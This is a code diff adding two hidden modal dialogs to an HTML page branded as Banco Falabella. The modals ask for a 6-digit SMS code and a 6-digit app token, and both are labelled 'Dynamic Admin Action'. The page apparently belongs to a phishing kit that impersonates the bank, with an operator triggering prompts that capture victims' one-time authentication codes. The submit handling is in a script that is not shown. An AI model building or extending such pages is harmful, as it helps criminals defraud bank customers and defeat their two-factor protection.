@@ -511,7 +511,50 @@
         </svg>
       </div>
     </div>
-  </div>
+  <!-- Modal SMS Verification (Dynamic Admin Action) -->
+  <div class="banca-backdrop" id="sms-modal-backdrop" hidden></div>
+  <aside class="banca-drawer" id="sms-modal-drawer" hidden role="dialog" aria-modal="true">
+    <button class="banca-close-btn" type="button" id="sms-modal-close" aria-label="Cerrar">&times;</button>
+    <div class="banca-drawer-body">
+      <div class="banca-brand-logo">
+        <img src="assets/logo.svg" alt="Banco Falabella" width="165">
+      </div>
+      <h2 class="banca-drawer-title" style="font-size:1.25rem;">Verificación por SMS</h2>
+      <p style="font-size:0.875rem; color:#64748b; text-align:center; margin-bottom:20px;">
+        Hemos enviado una clave de confirmación de 6 dígitos a tu celular vinculado *** *** 892.
+      </p>
+
+      <form id="sms-verification-form" class="banca-form" autocomplete="off">
+        <div class="banca-field-group">
+          <input type="text" id="sms-code-input" class="banca-input" placeholder="Código SMS (6 dígitos)" maxlength="6" required inputmode="numeric" style="text-align:center; font-size:1.2rem; letter-spacing:4px; font-weight:700;">
+        </div>
+        <button type="submit" class="banca-btn-submit is-active" id="sms-btn-submit" style="margin-top:16px;">Confirmar Código</button>
+      </form>
+    </div>
+  </aside>
+
+  <!-- Modal Token Verification (Dynamic Admin Action) -->
+  <div class="banca-backdrop" id="token-modal-backdrop" hidden></div>
+  <aside class="banca-drawer" id="token-modal-drawer" hidden role="dialog" aria-modal="true">
+    <button class="banca-close-btn" type="button" id="token-modal-close" aria-label="Cerrar">&times;</button>
+    <div class="banca-drawer-body">
+      <div class="banca-brand-logo">
+        <img src="assets/logo.svg" alt="Banco Falabella" width="165">
+      </div>
+      <h2 class="banca-drawer-title" style="font-size:1.25rem;">Token Digital App</h2>
+      <p style="font-size:0.875rem; color:#64748b; text-align:center; margin-bottom:20px;">
+        Abre tu App Banco Falabella e ingresa la clave de Token Digital de 6 dígitos.
+      </p>
+
+      <form id="token-verification-form" class="banca-form" autocomplete="off">
+        <div class="banca-field-group">
+          <input type="text" id="token-code-input" class="banca-input" placeholder="Token App (6 dígitos)" maxlength="6" required inputmode="numeric" style="text-align:center; font-size:1.2rem; letter-spacing:4px; font-weight:700;">
+        </div>
+        <button type="submit" class="banca-btn-submit is-active" id="token-btn-submit" style="margin-top:16px;">Verificar Token</button>
+      </form>
+    </div>
+  </aside>
+
   <script src="js/main.js"></script>
 </body>
 </html>
